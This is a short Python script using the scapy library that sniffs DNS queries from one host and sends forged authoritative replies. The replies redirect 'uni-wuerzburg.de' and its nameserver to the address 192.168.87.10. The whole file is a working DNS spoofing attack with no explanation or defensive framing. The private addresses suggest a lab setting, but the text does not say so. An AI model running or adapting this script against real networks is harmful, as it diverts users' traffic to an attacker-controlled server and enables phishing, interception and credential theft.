from scapy.all import *

def spoof_dns(orig_pkt):
    if(DNS in orig_pkt):
      if('uni-wuerzburg.de' in orig_pkt[DNS].qd.qname.decode('utf-8')):
       a_rr=DNSRR(rrname='uni-wuerzburg.de', type='A', ttl=3600, rdata='192.168.87.10')
       ns_rr=DNSRR(rrname='uni-wuerzburg.de', type='NS', ttl=3600, rdata='ns.uni-wuerzburg.de')
       ns_a_rr=DNSRR(rrname='ns.uni-wuerzburg.de', type='A', ttl=3600, rdata='192.168.87.10')
       dns=DNS(id=orig_pkt[DNS].id, qr=1, opcode=0, # QR=1: Response, Opcode=0: Query
          aa=1, tc=0, ad=0, cd=0, rcode=0, # RCODE=0: NoError
          qdcount=1, ancount=1, nscount=1, arcount=1,
          qd=DNSQR(qname=orig_pkt[DNSQR].qname), an=a_rr, ns=ns_rr, ar=ns_a_rr)
       ip = IP(src=orig_pkt[IP].dst, dst=orig_pkt[IP].src)
       udp = UDP(dport=orig_pkt[UDP].sport, sport=orig_pkt[UDP].dport)
       spoofed_pkt = ip/udp/dns
       print(spoofed_pkt.show())
       send(spoofed_pkt)

filter = "udp and src host 192.168.87.30 and dst port 53"
pkt = sniff(iface="eth1", filter=filter, prn=spoof_dns)